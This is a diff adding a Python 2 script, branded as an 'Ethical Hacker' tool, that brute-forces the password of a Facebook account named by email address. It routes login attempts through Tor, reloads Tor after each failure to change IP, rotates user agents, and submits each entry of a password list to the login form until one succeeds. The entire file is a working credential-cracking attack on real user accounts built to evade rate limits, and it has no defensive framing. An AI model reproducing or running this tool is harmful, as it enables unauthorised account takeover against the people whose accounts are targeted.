@@ -1,0 +1,149 @@
+#!/usr/bin/env python 2.7.11
+#
+#
+# 
+import os
+import sys
+import time
+import socks
+import socket
+import random
+import cookielib
+import mechanize
+from mechanize import Browser
+
+#Colors
+#########################
+Red =    '\033[0;31;48m'#
+Blue =   '\033[0;34;48m'#
+Green =  '\033[0;32;48m'#
+Yellow = '\033[0;33;48m'#
+White =  '\033[0;37;48m'#
+#########################
+
+if os.getuid() != 0:
+	os.system('clear');time.sleep(0.7);print '[!] run with root access';time.sleep(0.7);sys.exit()
+
+if os.path.exists('/usr/bin/tor') is False:
+	os.system('clear');time.sleep(0.7);print '[!] Installing Tor *Configure After';time.sleep(0.7);
+	os.system('apt-get install tor -y')
+def Display():
+	Sign = '''%s
+ _____ _   _   _         _    _____ _____ _____ _____ _____ _____ 
+|   __| |_| |_|_|___ ___| |  |  |  |  _  |     |  |  |   __| __  |
+|   __|  _|   | |  _| .'| |  |     |     |   --|    -|   __|    -|
+|_____|_| |_|_|_|___|__,|_|  |__|__|__|__|_____|__|__|_____|__|__|\n\nBy: Ethical H4CK3R\n\n'''%Blue
+	
+	print Sign
+
+#User 
+try:
+	os.system('clear');Display();print '%s '%Red
+	Email = raw_input('Enter Email: ');time.sleep(0.7)
+	if len(Email) is 0:
+		os.system('clear');print 'You Left Email Field Empty';time.sleep(0.7);sys.exit()
+
+	Passlist = raw_input('\nEnter Passlist: ');time.sleep(0.7)
+	if len(Passlist) is 0:
+		os.system('clear');print 'You Left Password Field Empty';time.sleep(0.7);sys.exit()
+	if os.path.exists(Passlist) is False:
+		os.system('clear');print "Can't Open %s"%Passlist;time.sleep(0.7);sys.exit()
+except:
+	os.system('clear')
+	print '%s[%s!%s]%s Exiting...' %(Yellow,Red,Yellow,Red)
+	os.system('service tor stop');time.sleep(0.9);sys.exit()
+
+#Start Tor
+os.system('service tor start');time.sleep(2)
+
+#Set Sockets
+def create_connection(address, timeout=None, source_address=None):
+    sock = socks.socksocket()
+    sock.connect(address)
+    return sock
+try:
+	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+
+	socket.socket = socks.socksocket
+	socket.create_connection = create_connection
+except:
+	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, "127.0.0.1", 9050)
+
+	socket.socket = socks.socksocket
+	socket.create_connection = create_connection
+
+#Headers
+useragents = [('User-agent', 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)','Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)','Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)','Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0','Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19','Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70','Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 9.50','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.26','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; es-la) Opera 9.27','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 9.52','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1','Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','    Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)','Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1','Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16')]
+  
+#Browser  
+Br = Browser()
+Br = mechanize.Browser()
+cj = cookielib.LWPCookieJar()
+Br.set_handle_robots(False)
+Br.set_handle_equiv(True)
+Br.set_handle_referer(True)
+Br.set_handle_redirect(True)
+Br.set_cookiejar(cj)
+Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+
+
+Passwords = open(Passlist,'r');
+
+Email = Email.replace('\n','')
+Url = 'https://beta.facebook.com/login.php?'
+
+Attempt = 1
+Pass = open(Passlist,'r')
+List = Pass.readlines()
+load = len(List)
+print load
+for Password in Passwords:
+	try:
+		
+		Password = Password.replace('\n','')
+		if Attempt is 8:
+			time.sleep(30)
+		os.system('clear');Display()
+		for i in range(10):
+			print '\n'
+		print '\n\n%s[%s!%s]%s Cracking'          %(Yellow,Red,Yellow,Red)
+		print "%s[%s-%s]%s Loaded:%s %s" %(Yellow,Blue,Yellow,Blue,Red,load)
+		print "%s[%s-%s]%s Email:%s %s" %(Yellow,Blue,Yellow,Blue,Red,Email)     
+		print "%s[%s-%s]%s Validating: %s%s" %(Yellow,Blue,Yellow,Blue,Red,Password)
+		print "%s[%s-%s]%s Attempt %s#%s: %s%d" %(Yellow,Blue,Yellow,Blue,Red,Blue,Blue,Attempt) 
+		Br.addheaders = [('User-agent', random.choice(useragents))]
+		def Found():
+			
+			os.system("clear");Display()
+			for i in range(11):
+				print '\n'
+			
+			print "%s[%s!%s] %sAccess Granted " %(Yellow,Red,Yellow,Blue)
+			print "%s[%s-%s]%s Attempt %s#: %s%d" %(Yellow,Blue,Yellow,Red,Blue,Red,Attempt) 
+			print "%s[%s-%s]%s Login: %s[%s %s %s]" %(Yellow,Blue,Yellow,Red,Yellow,Green,Email,Yellow)
+			print "%s[%s-%s]%s Password: %s[%s %s %s]%s\n" %(Yellow,Blue,Yellow,Red,Yellow,Green,Password,Yellow,White)
+			os.system("service tor stop")
+		Site = Br.open(Url)
+		Br.select_form(nr=0)
+		Br.form['email'] = Email
+		Br.form['pass'] = Password
+		Enter = Br.submit()
+		Login = Br.geturl()
+		if 'login' not in Login:
+			Found()
+			break
+
+		else:
+			os.system('service tor reload');time.sleep(3);Attempt+=1
+	except:
+		os.system('clear')
+		print '%s[%s!%s]%s Exiting...' %(Yellow,Red,Yellow,Red)
+		os.system('service tor stop');time.sleep(0.9);sys.exit()
+
+
+
+
+
+
+
+
